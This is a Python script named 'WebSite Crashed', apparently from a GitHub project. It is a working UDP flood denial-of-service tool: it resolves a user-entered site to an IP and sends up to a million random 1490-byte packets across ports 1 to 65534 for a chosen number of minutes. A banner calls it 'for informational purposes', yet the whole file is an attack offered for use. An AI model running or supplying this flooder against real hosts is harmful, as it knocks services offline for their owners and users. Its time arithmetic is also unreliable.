import sys
import os
import time
import socket
import random

os.system("clear")

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

mil = 0
mil = mil + 1000000
limit = 0
app = 0
port = 0

print('#################################################')
print ('Wellcome to CyberAttack PQ.softing')
print ('https://github.com/alexpikman')
print()
print ('WSC - WebSite Crashed [2021]')
print ('https://github.com/alexpikman/wsc')
print ('Originator - Alexandre Pikman [PQ]')
print()
print ('************************************************')
print ('*            !!! ATTENTION !!!                 *')
print ('* WebSite Crashed - for informational purposes *')
print ('************************************************')
print()
print('#################################################')
print()
print
site = input('Site name: ')
ip = socket.gethostbyname(site)
print ('searching...')
time.sleep(1)
print ('Site IP: ',ip)
print()
print('##########################################')
print()
now = datetime.now()
hour = now.hour
minute = now.minute
print
limit = int(input('Time attack limit(minute): '))
stopminute = 0
stopminute = minute + limit
print('Stop site attack in: %s:%s'%(hour,stopminute))
print('Maximum: 1 000 000 packs ~ 10 min')
print()
print('##########################################')

sent = 0
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
ibytes = random._urandom(1490)
while True:
            now = datetime.now()
            nowminute = now.minute
            port = port + 1
            sock.sendto(ibytes, (ip,port))
            sent = sent + 1
            stopattack = mil - sent 
            print('     [pack %s] remained %s'%(sent,stopattack),'Stop attack in %s:%s'%(hour,stopminute))
            
            if port == 65534:
                        port = 1                      
            if nowminute == stopminute:
                        sys.exit()
                        print('Task completed: ',sent, ' packs sented!')
            if sent == mil:
                        break
